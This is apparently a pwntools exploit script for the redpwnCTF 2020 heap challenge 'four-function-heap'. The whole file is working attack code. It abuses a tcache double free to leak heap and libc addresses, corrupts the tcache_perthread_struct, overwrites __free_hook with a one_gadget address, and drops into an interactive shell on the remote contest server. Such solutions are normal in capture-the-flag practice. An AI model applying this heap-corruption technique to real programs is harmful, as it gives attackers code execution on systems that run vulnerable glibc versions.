from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "../bin/four-function-heap"
#"""
HOST = "2020.redpwnc.tf"
PORT = 31774
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
off_malloc_hook = libc.symbols["__malloc_hook"]
off_free_hook = libc.symbols["__free_hook"]
off_unsorted = off_malloc_hook + 0x70
#libc_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def add(index, size, data):
	conn.sendlineafter("menu}}: ", "1")
	conn.sendlineafter("index}}: ", str(index))
	conn.sendlineafter("size}}: ", str(size))
	conn.sendafter("read}}: ", data)

def delete(index):
	conn.sendlineafter("menu}}: ", "2")
	conn.sendlineafter("index}}: ", str(index))

def put(index):
	conn.sendlineafter("menu}}: ", "3")
	conn.sendlineafter("index}}: ", str(index))

def exploit():
	add(0, 0xa8, "A\n") #heap_base + 0x260
	add(0, 0x248, "A\n")
	delete(0)
	delete(0) #doublefree
	put(0) #command5
	heap_chk = u64(conn.recv(6)+"\x00\x00")
	heap_base = heap_chk - 0x310 # 0x250+0xb0+0x10
	
	add(0, 0x248, p64(heap_base+0x10))
	add(0, 0x248, "a")

	perth_struct = p64(0)
	perth_struct += p64(0x800) # set counts[indexof(0xb0)]
	perth_struct += p64(0)*6
	perth_struct += p64(0)*(0xb-0x2)
	perth_struct += p64(heap_base+0x260) # set tcache[indexof(0x20)]
	
	add(0, 0x248, perth_struct) # command8: get tcache_perthread_struct
	delete(0)
	add(0, 0xa8, "a")
	delete(0)
	put(0) 
	
	libc_unsorted = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_unsorted - off_unsorted
	libc_free_hook = libc_base + off_free_hook
	one_gadget = libc_base + gadget[1]
	print hex(libc_base)	
	print hex(heap_base)
	
	perth_struct = p64(0)*8
	perth_struct += p64(libc_free_hook)
	
	add(0, 0x248, perth_struct) # get tcache_perthread_struct
	add(0, 0x18, p64(one_gadget)) # get free_hook
	delete(0) #e

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
